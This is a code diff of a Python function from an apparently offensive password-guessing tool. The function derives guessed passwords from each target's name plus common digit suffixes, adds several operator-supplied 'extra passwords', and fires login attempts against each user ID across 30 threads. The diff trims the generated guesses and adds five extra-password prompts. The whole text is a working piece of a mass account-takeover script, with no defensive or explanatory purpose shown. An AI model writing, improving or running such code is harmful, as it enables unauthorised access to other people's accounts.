@@ -17,38 +17,32 @@ def sorting(users,cek=False):
     with ThreadPoolExecutor(max_workers=30) as ex:
         if not cek:
             expas = input("# extra password : ")
+            expas1 = input("# extra password : ")
+            expas2 = input("# extra password : ")
+            expas3 = input("# extra password : ")
+            expas4 = input("# extra password : ")
+            expas5 = input("# extra password : ")
             for user in users:
                 users = user.split('|')
                 ss = users[0].split(' ')
                 if len(ss) == 1:
                     pass1 = ss[0] + "123"
                     pass2 = ss[0] + "12345"
-                    pass3 = ss[0] + "12"
-                    pass4 = ss[0] + "1234"
-                    pass5 = ss[0] + "01"
-                    pass6 = ss[0] + "123456"
                 elif len(ss) == 2:
                     pass1 = ss[0] + "123"
-                    pass2 = ss[0] + "12345"
-                    pass3 = ss[1] + "12"
-                    pass4 = ss[1] + "1234"
-                    pass5 = ss[0] + "123456"
-                    pass6 = ss[0] + "01"
+                    pass2 = ss[1] + "12345"
                 elif len(ss) == 3:
-                    pass1 = ss[0] + "123"
-                    pass2 = ss[0] + "12345"
-                    pass3 = ss[0] + "12"
-                    pass4 = ss[1] + "01"
-                    pass5 = ss[1] + "12"
-                    pass6 = ss[1] + "12345"
+                    pass1 = ss[1] + "123"
+                    pass2 = ss[1] + "12345"
                 listpass = [
                         pass1,
                         pass2,
-                        pass3,
-                        pass4,
-                        pass5,
-                        pass6,
                         expas,
+                        expas1,
+                        expas2,
+                        expas3,
+                        expas4,
+                        expas5,
                     ]
                 for passw in listpass:
                     ex.submit(login,(users[1]),(passw))
